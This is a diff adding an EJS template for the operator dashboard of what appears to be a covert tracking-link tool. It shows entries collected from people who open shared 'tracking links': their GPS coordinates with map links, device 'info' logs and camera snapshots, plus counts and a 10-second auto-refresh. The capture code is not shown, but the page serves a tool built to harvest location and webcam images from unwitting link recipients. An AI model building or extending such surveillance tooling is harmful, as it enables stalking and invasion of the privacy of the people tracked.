@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - <%= userId %>
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+    <div class="container">
+        <header class="header">
+            <h1>📊 Dashboard</h1>
+            <p class="subtitle">User ID: <%= userId %>
+            </p>
+            <a href="/" class="btn btn-secondary">← Back to Home</a>
+        </header>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>Collected Data (<%= data.length %> entries)</h2>
+            </div>
+            <div class="card-body">
+                <% if (data.length===0) { %>
+                    <div class="empty-state">
+                        <p>No data collected yet. Share your tracking links to start collecting information.</p>
+                    </div>
+                    <% } else { %>
+                        <div class="data-list">
+                            <% data.reverse().forEach((entry, index)=> { %>
+                                <div class="data-entry">
+                                    <div class="data-header">
+                                        <span class="timestamp">
+                                            <%= new Date(entry.timestamp).toLocaleString() %>
+                                        </span>
+                                        <span class="badge <%= entry.data.type %>">
+                                            <%= entry.data.type %>
+                                        </span>
+                                    </div>
+                                    <div class="data-content">
+                                        <% if (entry.data.type==='location' ) { %>
+                                            <div class="location-data">
+                                                <p><strong>Latitude:</strong>
+                                                    <%= entry.data.latitude %>
+                                                </p>
+                                                <p><strong>Longitude:</strong>
+                                                    <%= entry.data.longitude %>
+                                                </p>
+                                                <p><strong>Accuracy:</strong>
+                                                    <%= entry.data.accuracy %> meters
+                                                </p>
+                                                <a href="https://www.google.com/maps?q=<%= entry.data.latitude %>,<%= entry.data.longitude %>"
+                                                    target="_blank" class="btn btn-sm">
+                                                    View on Map
+                                                </a>
+                                            </div>
+                                            <% } else if (entry.data.type==='info' ) { %>
+                                                <pre class="info-data"><%= entry.data.content %></pre>
+                                                <% } else if (entry.data.type==='camsnap' ) { %>
+                                                    <div class="camsnap-data">
+                                                        <p><strong>Camera Snapshot:</strong>
+                                                            <%= entry.data.filename %>
+                                                        </p>
+                                                        <img src="/data/<%= entry.data.filename %>"
+                                                            alt="Camera snapshot" class="snapshot-img">
+                                                    </div>
+                                                    <% } %>
+                                    </div>
+                                </div>
+                                <% }) %>
+                        </div>
+                        <% } %>
+            </div>
+        </div>
+
+        <div class="stats-card">
+            <h3>📈 Statistics</h3>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="stat-value">
+                        <%= data.length %>
+                    </div>
+                    <div class="stat-label">Total Entries</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">
+                        <%= data.filter(e=> e.data.type === 'location').length %>
+                    </div>
+                    <div class="stat-label">Locations</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">
+                        <%= data.filter(e=> e.data.type === 'info').length %>
+                    </div>
+                    <div class="stat-label">Info Logs</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">
+                        <%= data.filter(e=> e.data.type === 'camsnap').length %>
+                    </div>
+                    <div class="stat-label">Snapshots</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-refresh every 10 seconds
+        setTimeout(() => {
+            location.reload();
+        }, 10000);
+    </script>
+</body>
+
+</html>
